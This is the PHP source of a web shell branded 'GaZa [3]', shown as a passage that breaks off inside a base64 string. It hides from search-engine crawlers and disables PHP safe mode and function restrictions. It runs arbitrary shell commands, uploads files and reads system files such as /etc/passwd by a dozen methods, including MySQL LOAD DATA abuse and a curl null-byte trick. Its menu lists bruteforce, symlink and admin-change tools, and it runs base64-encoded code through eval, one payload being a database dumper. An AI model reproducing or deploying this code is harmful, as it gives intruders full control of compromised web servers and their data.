<?
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
error_reporting(0); 
$function_tkl = $_POST['function_tkl'];
$pwd = $_POST['pwd'];
$dir = $_POST['dir'];
if ($dir == ''){
$dir = getcwd();
}
if ($gaza == 'ini'){
$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
}
if (!empty ($_FILES['gazaUP']))
{
    move_uploaded_file($_FILES['gazaUP']['tmp_name'],$dir.'/'.$_FILES['gazaUP']['name']);
    $gaza_text = "<b>Uploaded Successfully</b><br>file name : ".$_FILES['gazaUP']['name']."<br>file size : ".$_FILES['gazaUP']['size']."<br>file type : ".$_FILES['gazaUP']['type']."<br>";
}
if ($function_tkl == 'mysql'){
 $gaza_text1 = "<form method='POST' align='center'>
<br>
 :::Please enter your Database information:::
 <br>Host Name:<input type='text' name='host_name' value='localhost' ><br>
User Name :<input type='text' name='user_name' ><br>
User Pass :<input type='text' name='user_pass'  ><br>
Database Name :<input type='text' name='db_name' ><br>
File to Read :<input type='text' name='gaza_mysql_file' value='/etc/passwd'><br>
<input type='hidden' name='function_tkl' value='mysql1' ><br>
<input type='submit' value='Read' ><br>
</form>
"; 
}
if ($function_tkl == 'mysql1'){

$host_name = $_POST['host_name']; // e.g : localhost
$user_name = $_POST['user_name']; // e.g : gaza_hacker
$user_pass = $_POST['user_pass']; // e.g : 123456
$db_name = $_POST['db_name']; // e.g : tkl_3654654
$gaza_mysql_file = $_POST['gaza_mysql_file']; // e.g : /etc/passwd
$mysql_use = "yes";
$inquiry = array (
"USE $db_name",
'CREATE TEMPORARY TABLE ' . ($tkl_table = 'A'.time ()) . ' (a LONGBLOB)',
"LOAD DATA LOCAL INFILE '$gaza_mysql_file' INTO TABLE $tkl_table FIELDS "
. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
. "ESCAPED BY          '' "
. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

"SELECT a FROM $tkl_table LIMIT 1"
);
mysql_connect ($host_name, $user_name, $user_pass);

foreach ($inquiry as $inquiry_info) {
 $quiry = mysql_query ($inquiry_info);
if ($quiry == false) die (
"error: " . $inquiry_info . "\n" .
"error info: " . mysql_error () . "\n"
 );
if (! $tkl_read = @mysql_fetch_array ($quiry, MYSQL_NUM)) continue;
$gaza_file = htmlspecialchars($tkl_read[0]);
  mysql_free_result ($quiry);
}
}
function readFileTKL ($function_tkl,$pwd) {

switch($function_tkl){
case "show_source":
htmlspecialchars(show_source($pwd));
break;
case "readfile":
htmlspecialchars(readfile($pwd));
break;
case "include":
htmlspecialchars(include $pwd);
break;
case "fpassthru":
$fp = fopen($pwd, 'r');
htmlspecialchars(fpassthru($fp));
break;
case "file":
$output = file($pwd);
foreach( $output as $line )
{
    echo htmlspecialchars($line . "\n");
}
break;
case "highlight_file":
htmlspecialchars(highlight_file($pwd));
break;
case "curl":
$tkl_cu =
curl_init("file:///".$pwd."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($tkl_cu);
htmlspecialchars(var_dump(curl_exec($tkl_cu)));
break;
case "posix_getpwuid":
for($uid=0;$uid<2000;$uid++){
$gaza_ar = posix_getpwuid($uid);
if (!empty($gaza_ar)) {
while (list ($key, $val) = each($gaza_ar)){
print "$val:";
 }
 print "\n";
 }
}
break;
case "copy":
$tmp=tempnam($ooopo, "cx");
if(copy("compress.zlib://".$pwd, $tmp)){
$ioio = fopen($tmp, "r");
echo fread($ioio, filesize($tmp));
fclose($ioio);
unlink($tmp);
};
break;
case "fgets":
$handle = @fopen($pwd, "r");
if ($handle) {
    while (($buffer = fgets($handle, 4096)) !== false) {
        echo  $gaza_file.$buffer;
    }
    fclose($handle);
}
break;
case "file_get_contents":
echo file_get_contents($pwd);

break;
case "fread":
$handle = fopen($pwd, "r");
echo  fread($handle, filesize($pwd));
fclose($handle);
break;
case "stream_get_contents":
if ($stream = fopen($pwd, 'r')) {
     echo  stream_get_contents($stream, -1, 10);
    fclose($stream);
}
break;
}
}
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	echo $out;
	}
}
function hidTKL () {
echo "
<html>
<head>
<title>GaZa [3] ~!!</title>
<meta http-equiv='Content-Type' content='text/html; charset=windows-1256' />
<style>
body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; }
h1,h3 { color:white; font-family:Verdana; font-size:11px; }
input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }
textarea { font-family:Courier; }
a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; }
a:hover { color:rgb(0, 250, 0); }
td { font-size:12px; vertical-align:middle; }
th { font-size:13px; vertical-align:middle; }
table { empty-cells:show; }
.inf { color:#7F7F7F; }
</style>
<!--
###################################################################
#        :'######::::::'###::::'########::::'###::::              #
#        '##... ##::::'## ##:::..... ##::::'## ##:::              #
#         ##:::..::::'##:. ##:::::: ##::::'##:. ##::              #
#         ##::'####:'##:::. ##:::: ##::::'##:::. ##:              #
#         ##::: ##:: #########::: ##::::: #########:              #
#         ##::: ##:: ##.... ##:: ##:::::: ##.... ##:              #
#        . ######::: ##:::: ##: ########: ##:::: ##:              #
#        :......::::..:::::..::........::..:::::..::              #
#  '##::::'##::::'###:::::'######::'##:::'##:'########:'########::#
#   ##:::: ##:::'## ##:::'##... ##: ##::'##:: ##.....:: ##.... ##:#
#   ##:::: ##::'##:. ##:: ##:::..:: ##:'##::: ##::::::: ##:::: ##:#
#   #########:'##:::. ##: ##::::::: #####:::: ######::: ########::#
#   ##.... ##: #########: ##::::::: ##. ##::: ##...:::: ##.. ##:::#
#   ##:::: ##: ##.... ##: ##::: ##: ##:. ##:: ##::::::: ##::. ##::#
#   ##:::: ##: ##:::: ##:. ######:: ##::. ##: ########: ##:::. ##:#
#  ..:::::..::..:::::..:::......:::..::::..::........::..:::::..::#
#        '########:'########::::'###::::'##::::'##:               #
#        ... ##..:: ##.....::::'## ##::: ###::'###:               #
#        ::: ##:::: ##::::::::'##:. ##:: ####'####:               #
#        ::: ##:::: ######:::'##:::. ##: ## ### ##:               #
#        ::: ##:::: ##...:::: #########: ##. #: ##:               #
#        ::: ##:::: ##::::::: ##.... ##: ##:.:: ##:               #
#        ::: ##:::: ########: ##:::: ##: ##:::: ##:               #
#        :::..:::::........::..:::::..::..:::::..::               #
#                 WwW.Gaza-Hacker.NeT                             #
#                       GaZa [3]                                  #
#                    Coded By TKL                                 #
###################################################################
-->

</head>
<body>
<hr>
<form method='GET'>
<input type='submit' value='Home' size='10' >
<input type='submit' name='tool' value='Files' size='10' >
<input type='submit' name='tool' value='Bruteforce' size='10' >
<input type='submit' name='tool' value='bypass' size='10' >
<input type='submit' name='tool' value='SQL' size='10' >
<input type='submit' name='tool' value='symlink' size='10' >
<input type='submit' name='tool' value='Change-Admin' size='10' >
<input type='submit' name='tool' value='vBulletin-Tool' size='10' >
<input type='submit' name='tool' value='Server-Info' size='10' >
<input type='submit' name='tool' value='About' size='10' >
</form>
<hr>";
}
function fotTKL($gaza_text,$gaza_text1,$dir) {
echo "</textarea>
		</td>
</tr>
<tr>
<td>
<left>
<form method='POST'>
<input type='text' name='dir' value= '".$dir."' size='30' >
<input type='submit' value='>>' size='10' >
</form>
</left>
</td>
	<form method='POST'>			<p>
			<input type='text' name='command' />
			<input type='submit' value='Execute' />
		
			</p>
		</form>
		
<td align='right'  >
		<form method='POST'>			<p>
			<input type='text' name='pwd' value='/etc/passwd' />
			<select name='function_tkl'>
				<option value='curl'>curl</option>
				<option value='show_source'>show source</option>
				<option value='stream_get_contents'>stream get contents</option>
				<option value='readfile'>readfile</option>
				<option value='include'>include</option>
				<option value='fpassthru'>fpassthru</option>
				<option value='fread'>fread</option>
				<option value='file_get_contents'>file get contents</option>
				<option value='file'>file</option>
				<option value='fgets'>fgets</option>
				<option value='copy'>copy</option>
				<option value='highlight_file'>highlight file</option>
				<option value='posix_getpwuid'>posix_getpwuid</option>
				<option value='mysql'>MYsql</option>
				</select>
			<input type='submit' value='Read' />
			</p>
		</form>
</td>
</tr>
</table>
<hr>
<left>
<form method='POST' enctype='multipart/form-data'>
<input type='file' name='gazaUP' size='23' >
<input type='text' name='dir' value='".$dir."' >
<input type='submit' value='Upload' size='35' >
</form>
</left>
<table width='100%'>
<tr>
<td width='50%'>
".$gaza_text."
</td>
<td   width='50%' >
".$gaza_text1."
</td>
</tr>
</table>
</body>
</html>";
}
function toolTKL () {
$tkl_tool = $_GET['tool'];
switch($tkl_tool){
case "About":
$tkl = "ZWNobyAiR2FaYSBTaGVsbCBWIDMgPGJyIC8+PGEgaHJlZj0naHR0cDovL2dhemEtaGFja2VyLm5ldCcgdGFyZ2V0PSdfYmxhbmsnPkdhemEgSGFDS2VSIFRlYW08L2E+PGJyIC8+IERldmVsb3BlZCBieSA8YSBocmVmPSdodHRwOi8vd3d3LmZhY2Vib29rLmNvbS9kci50a2wnIHRhcmdldD0nX2JsYW5rJz5US0w8L2E+IjsK";
eval(base64_decode($tkl));
exit;
case "SQL":
$tkl = "ZWNobyAiPHNjcmlwdD4gICAgIHZhciBwMV8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AxJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AxJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBwMl8gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AyJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AyJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBwM18gPSAnIiAuICgoc3RycG9zKEAkX1BPU1RbJ3AzJ10sIlxuIikhPT1mYWxzZSk/Jyc6aHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ3AzJ10sRU5UX1FVT1RFUykpIC4iJzsgICAgIHZhciBkID0gZG9jdW1lbnQ7IAlmdW5jdGlvbiBzZXQoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsgCQlpZihhIT1udWxsKWQubWYuYS52YWx1ZT1hO2Vsc2UgZC5tZi5hLnZhbHVlPWFfOyAJCWlmKGMhPW51bGwpZC5tZi5jLnZhbHVlPWM7ZWxzZSBkLm1mLmMudmFsdWU9Y187IAkJaWYocDEhPW51bGwpZC5tZi5wMS52YWx1ZT1wMTtlbHNlIGQubWYucDEudmFsdWU9cDFfOyAJCWlmKHAyIT1udWxsKWQubWYucDIudmFsdWU9cDI7ZWxzZSBkLm1mLnAyLnZhbHVlPXAyXzsgCQlpZihwMyE9bnVsbClkLm1mLnAzLnZhbHVlPXAzO2Vsc2UgZC5tZi5wMy52YWx1ZT1wM187IAkJaWYoY2hhcnNldCE9bnVsbClkLm1mLmNoYXJzZXQudmFsdWU9Y2hhcnNldDtlbHNlIGQubWYuY2hhcnNldC52YWx1ZT1jaGFyc2V0XzsgCX0gCWZ1bmN0aW9uIGcoYSxjLHAxLHAyLHAzLGNoYXJzZXQpIHsgCQlzZXQoYSxjLHAxLHAyLHAzLGNoYXJzZXQpOyAJCWQubWYuc3VibWl0KCk7IAl9ICA8L3NjcmlwdD4iOyAJY2xhc3MgRGJDbGFzcyB7IAkJdmFyICR0eXBlOyAJCXZhciAkbGluazsgCQl2YXIgJHJlczsgCQlmdW5jdGlvbiBEYkNsYXNzKCR0eXBlKQl7IAkJCSR0aGlzLT50eXBlID0gJHR5cGU7IAkJfSAJCWZ1bmN0aW9uIGNvbm5lY3QoJGhvc3QsICR1c2VyLCAkcGFzcywgJGRibmFtZSl7IAkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJeyAJCQkJY2FzZSAnbXlzcWwnOiAJCQkJCWlmKCAkdGhpcy0+bGluayA9IEBteXNxbF9jb25uZWN0KCRob3N0LCR1c2VyLCRwYXNzLHRydWUpICkgcmV0dXJuIHRydWU7IAkJCQkJYnJlYWs7IAkJCQljYXNlICdwZ3NxbCc6IAkJCQkJJGhvc3QgPSBleHBsb2RlKCc6JywgJGhvc3QpOyAJCQkJCWlmKCEkaG9zdFsxXSkgJGhvc3RbMV09NTQzMjsgCQkJCQlpZiggJHRoaXMtPmxpbmsgPSBAcGdfY29ubmVjdCgiaG9zdD17JGhvc3RbMF19IHBvcnQ9eyRob3N0WzFdfSB1c2VyPSR1c2VyIHBhc3N3b3JkPSRwYXNzIGRibmFtZT0kZGJuYW1lIikgKSByZXR1cm4gdHJ1ZTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIHNlbGVjdGRiKCRkYikgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlpZiAoQG15c3FsX3NlbGVjdF9kYigkZGIpKXJldHVybiB0cnVlOyAJCQkJCWJyZWFrOyAJCQl9IAkJCXJldHVybiBmYWxzZTsgCQl9IAkJZnVuY3Rpb24gcXVlcnkoJHN0cikgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpIHsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9IEBteXNxbF9xdWVyeSgkc3RyKTsgCQkJCQlicmVhazsgCQkJCWNhc2UgJ3Bnc3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9IEBwZ19xdWVyeSgkdGhpcy0+bGluaywkc3RyKTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGZldGNoKCkgeyAJCQkkcmVzID0gZnVuY19udW1fYXJncygpP2Z1bmNfZ2V0X2FyZygwKTokdGhpcy0+cmVzOyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gQG15c3FsX2ZldGNoX2Fzc29jKCRyZXMpOyAJCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiBAcGdfZmV0Y2hfYXNzb2MoJHJlcyk7IAkJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBsaXN0RGJzKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5xdWVyeSgiU0hPVyBkYXRhYmFzZXMiKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gJHRoaXMtPnF1ZXJ5KCJTRUxFQ1QgZGF0bmFtZSBGUk9NIHBnX2RhdGFiYXNlIFdIRVJFIGRhdGlzdGVtcGxhdGUhPSd0JyIpOyAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBsaXN0VGFibGVzKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gJHRoaXMtPnJlcyA9ICR0aGlzLT5xdWVyeSgnU0hPVyBUQUJMRVMnKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCXJldHVybiAkdGhpcy0+cmVzID0gJHRoaXMtPnF1ZXJ5KCJzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hICE9ICdpbmZvcm1hdGlvbl9zY2hlbWEnIEFORCB0YWJsZV9zY2hlbWEgIT0gJ3BnX2NhdGFsb2cnIik7IAkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGVycm9yKCkgeyAJCQlzd2l0Y2goJHRoaXMtPnR5cGUpCXsgCQkJCWNhc2UgJ215c3FsJzogCQkJCQlyZXR1cm4gQG15c3FsX2Vycm9yKCk7IAkJCQlicmVhazsgCQkJCWNhc2UgJ3Bnc3FsJzogCQkJCQlyZXR1cm4gQHBnX2xhc3RfZXJyb3IoKTsgCQkJCWJyZWFrOyAJCQl9IAkJCXJldHVybiBmYWxzZTsgCQl9IAkJZnVuY3Rpb24gc2V0Q2hhcnNldCgkc3RyKSB7IAkJCXN3aXRjaCgkdGhpcy0+dHlwZSkJeyAJCQkJY2FzZSAnbXlzcWwnOiAJCQkJCWlmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfc2V0X2NoYXJzZXQnKSkgCQkJCQkJcmV0dXJuIEBteXNxbF9zZXRfY2hhcnNldCgkc3RyLCAkdGhpcy0+bGluayk7IAkJCQkJZWxzZSAJCQkJCQkkdGhpcy0+cXVlcnkoJ1NFVCBDSEFSU0VUICcuJHN0cik7IAkJCQkJYnJlYWs7IAkJCQljYXNlICdwZ3NxbCc6IAkJCQkJcmV0dXJuIEBwZ19zZXRfY2xpZW50X2VuY29kaW5nKCR0aGlzLT5saW5rLCAkc3RyKTsgCQkJCQlicmVhazsgCQkJfSAJCQlyZXR1cm4gZmFsc2U7IAkJfSAJCWZ1bmN0aW9uIGxvYWRGaWxlKCRzdHIpIHsgCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7IAkJCQljYXNlICdteXNxbCc6IAkJCQkJcmV0dXJuICR0aGlzLT5mZXRjaCgkdGhpcy0+cXVlcnkoIlNFTEVDVCBMT0FEX0ZJTEUoJyIuYWRkc2xhc2hlcygkc3RyKS4iJykgYXMgZmlsZSIpKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCSR0aGlzLT5xdWVyeSgiQ1JFQVRFIFRBQkxFIHdzbzIoZmlsZSB0ZXh0KTtDT1BZIHdzbzIgRlJPTSAnIi5hZGRzbGFzaGVzKCRzdHIpLiInO3NlbGVjdCBmaWxlIGZyb20gd3NvMjsiKTsgCQkJCQkkcj1hcnJheSgpOyAJCQkJCXdoaWxlKCRpPSR0aGlzLT5mZXRjaCgpKSAJCQkJCQkkcltdID0gJGlbJ2ZpbGUnXTsgCQkJCQkkdGhpcy0+cXVlcnkoJ2Ryb3AgdGFibGUgd3NvMicpOyAJCQkJCXJldHVybiBhcnJheSgnZmlsZSc9PmltcGxvZGUoIlxuIiwkcikpOyAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCQlmdW5jdGlvbiBkdW1wKCR0YWJsZSwgJGZwID0gZmFsc2UpIHsgCQkJc3dpdGNoKCR0aGlzLT50eXBlKQl7IAkJCQljYXNlICdteXNxbCc6IAkJCQkJJHJlcyA9ICR0aGlzLT5xdWVyeSgnU0hPVyBDUkVBVEUgVEFCTEUgYCcuJHRhYmxlLidgJyk7IAkJCQkJJGNyZWF0ZSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXMpOyAJCQkJCSRzcWwgPSAkY3JlYXRlWzFdLiI7XG4iOyAgICAgICAgICAgICAgICAgICAgIGlmKCRmcCkgZndyaXRlKCRmcCwgJHNxbCk7IGVsc2UgZWNobygkc3FsKTsgCQkJCQkkdGhpcy0+cXVlcnkoJ1NFTEVDVCAqIEZST00gYCcuJHRhYmxlLidgJyk7ICAgICAgICAgICAgICAgICAgICAgJGhlYWQgPSB0cnVlOyAJCQkJCXdoaWxlKCRpdGVtID0gJHRoaXMtPmZldGNoKCkpIHsgCQkJCQkJJGNvbHVtbnMgPSBhcnJheSgpOyAJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrPT4kdikgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHYgPT0gbnVsbCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXRlbVska10gPSAiTlVMTCI7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoaXNfbnVtZXJpYygkdikpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJGtdID0gJHY7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJGtdID0gIiciLkBteXNxbF9yZWFsX2VzY2FwZV9zdHJpbmcoJHYpLiInIjsgCQkJCQkJCSRjb2x1bW5zW10gPSAiYCIuJGsuImAiOyAJCQkJCQl9ICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRoZWFkKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3FsID0gJ0lOU0VSVCBJTlRPIGAnLiR0YWJsZS4nYCAoJy5pbXBsb2RlKCIsICIsICRjb2x1bW5zKS4iKSBWQUxVRVMgXG5cdCgiLmltcGxvZGUoIiwgIiwgJGl0ZW0pLicpJzsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRoZWFkID0gZmFsc2U7ICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNxbCA9ICJcblx0LCgiLmltcGxvZGUoIiwgIiwgJGl0ZW0pLicpJzsgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGZwKSBmd3JpdGUoJGZwLCAkc3FsKTsgZWxzZSBlY2hvKCRzcWwpOyAJCQkJCX0gICAgICAgICAgICAgICAgICAgICBpZighJGhlYWQpICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRmcCkgZndyaXRlKCRmcCwgIjtcblxuIik7IGVsc2UgZWNobygiO1xuXG4iKTsgCQkJCWJyZWFrOyAJCQkJY2FzZSAncGdzcWwnOiAJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSAnLiR0YWJsZSk7IAkJCQkJd2hpbGUoJGl0ZW0gPSAkdGhpcy0+ZmV0Y2goKSkgeyAJCQkJCQkkY29sdW1ucyA9IGFycmF5KCk7IAkJCQkJCWZvcmVhY2goJGl0ZW0gYXMgJGs9PiR2KSB7IAkJCQkJCQkkaXRlbVska10gPSAiJyIuYWRkc2xhc2hlcygkdikuIiciOyAJCQkJCQkJJGNvbHVtbnNbXSA9ICRrOyAJCQkJCQl9ICAgICAgICAgICAgICAgICAgICAgICAgICRzcWwgPSAnSU5TRVJUIElOVE8gJy4kdGFibGUuJyAoJy5pbXBsb2RlKCIsICIsICRjb2x1bW5zKS4nKSBWQUxVRVMgKCcuaW1wbG9kZSgiLCAiLCAkaXRlbSkuJyk7Jy4iXG4iOyAgICAgICAgICAgICAgICAgICAgICAgICBpZigkZnApIGZ3cml0ZSgkZnAsICRzcWwpOyBlbHNlIGVjaG8oJHNxbCk7IAkJCQkJfSAJCQkJYnJlYWs7IAkJCX0gCQkJcmV0dXJuIGZhbHNlOyAJCX0gCX07IAkkZGIgPSBuZXcgRGJDbGFzcygkX1BPU1RbJ3R5cGUnXSk7IAlpZihAJF9QT1NUWydwMiddPT0nZG93bmxvYWQnKSB7IAkJJGRiLT5jb25uZWN0KCRfUE9TVFsnc3FsX2hvc3QnXSwgJF9QT1NUWydzcWxfbG9naW4nXSwgJF9QT1NUWydzcWxfcGFzcyddLCAkX1BPU1RbJ3NxbF9iYXNlJ10pOyAJCSRkYi0+c2VsZWN0ZGIoJF9QT1NUWydzcWxfYmFzZSddKTsgICAgICAgICBzd2l0Y2goJF9QT1NUWydjaGFyc2V0J10pIHsgICAgICAgICAgICAgY2FzZSAiV2luZG93cy0xMjUxIjogJGRiLT5zZXRDaGFyc2V0KCdjcDEyNTEnKTsgYnJlYWs7ICAgICAgICAgICAgIGNhc2UgIlVURi04IjogJGRiLT5zZXRDaGFyc2V0KCd1dGY4Jyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJLT0k4LVIiOiAkZGItPnNldENoYXJzZXQoJ2tvaThyJyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJLT0k4LVUiOiAkZGItPnNldENoYXJzZXQoJ2tvaTh1Jyk7IGJyZWFrOyAgICAgICAgICAgICBjYXNlICJjcDg2NiI6ICRkYi0+c2V0Q2hhcnNldCgnY3A4NjYnKTsgYnJlYWs7ICAgICAgICAgfSAgICAgICAgIGlmKGVtcHR5KCRfUE9TVFsnZmlsZSddKSkgeyAgICAgICAgICAgICBvYl9zdGFydCgib2JfZ3poYW5kbGVyIiwgNDA5Nik7ICAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9ZHVtcC5zcWwiKTsgICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvcGxhaW4iKTsgICAgICAgICAgICAgZm9yZWFjaCgkX1BPU1RbJ3RibCddIGFzICR2KSAJCQkJJGRiLT5kdW1wKCR2KTsgICAgICAgICAgICAgZXhpdDsgICAgICAgICB9IGVsc2VpZigkZnAgPSBAZm9wZW4oJF9QT1NUWydmaWxlJ10sICd3JykpIHsgICAgICAgICAgICAgZm9yZWFjaCgkX1BPU1RbJ3RibCddIGFzICR2KSAgICAgICAgICAgICAgICAgJGRiLT5kdW1wKCR2LCAkZnApOyAgICAgICAgICAgICBmY2xvc2UoJGZwKTsgICAgICAgICAgICAgdW5zZXQoJF9QT1NUWydwMiddKTsgICAgICAgICB9IGVsc2UgICAgICAgICAgICAgZGllKCc8c2NyaXB0PmFsZXJ0KCJFcnJvciEgQ2FuXCd0IG9wZW4gZmlsZSIpO3dpbmRvdy5oaXN0b3J5LmJhY2soLTEpPC9zY3JpcHQ+Jyk7IAl9ICAJZWNobyAiIDxkaXYgY2xhc3M9Y29udGVudD4gPGZvcm0gbmFtZT0nc2YnIG1ldGhvZD0ncG9zdCcgb25zdWJtaXQ9J2ZzKHRoaXMpOyc+PHRhYmxlIGNlbGxwYWRkaW5nPScyJyBjZWxsc3BhY2luZz0nMCc+PHRyPiA8dGQ+VHlwZTwvdGQ+PHRkPkhvc3Q8L3RkPjx0ZD5Mb2dpbjwvdGQ+PHRkPlBhc3N3b3JkPC90ZD48dGQ+RGF0YWJhc2U8L3RkPjx0ZD48L3RkPjwvdHI+PHRyPiA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPVNxbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1wMSB2YWx1ZT0ncXVlcnknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXAyIHZhbHVlPScnPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9JyIuIGh0bWxzcGVjaWFsY2hhcnMoJEdMT0JBTFNbJ2N3ZCddKSAuIic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9Y2hhcnNldCB2YWx1ZT0nIi4gKGlzc2V0KCRfUE9TVFsnY2hhcnNldCddKT8kX1BPU1RbJ2NoYXJzZXQnXTonJykgLiInPiA8dGQ+PHNlbGVjdCBuYW1lPSd0eXBlJz48b3B0aW9uIHZhbHVlPSdteXNxbCcgIjsgICAgIGlmKEAkX1BPU1RbJ3R5cGUnXT09J215c3FsJyllY2hvICdzZWxlY3RlZCc7IGVjaG8gIj5NeVNxbDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9J3Bnc3FsJyAiOyBpZihAJF9QT1NUWyd0eXBlJ109PSdwZ3NxbCcpZWNobyAnc2VsZWN0ZWQnOyBlY2hvICI+UG9zdGdyZVNxbDwvb3B0aW9uPjwvc2VsZWN0PjwvdGQ+IDx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2hvc3QgdmFsdWU9JyIuIChlbXB0eSgkX1BPU1RbJ3NxbF9ob3N0J10pPydsb2NhbGhvc3QnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydzcWxfaG9zdCddKSkgLiInPjwvdGQ+IDx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2xvZ2luIHZhbHVlPSciLiAoZW1wdHkoJF9QT1NUWydzcWxfbG9naW4nXSk/J3Jvb3QnOmh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydzcWxfbG9naW4nXSkpIC4iJz48L3RkPiA8dGQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXNxbF9wYXNzIHZhbHVlPSciLiAoZW1wdHkoJF9QT1NUWydzcWxfcGFzcyddKT8nJzpodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnc3FsX3Bhc3MnXSkpIC4iJz48L3RkPjx0ZD4iOyAJJHRtcCA9ICI8aW5wdXQgdHlwZT10ZXh0IG5hbWU9c3FsX2Jhc2UgdmFsdWU9Jyc+IjsgCWlmKGlzc2V0KCRfUE9TVFsnc3FsX2hvc3QnXSkpeyAJCWlmKCRkYi0+Y29ubmVjdCgkX1BPU1RbJ3NxbF9ob3N0J10sICRfUE9TVFsnc3FsX2xvZ2luJ10sICRfUE9TV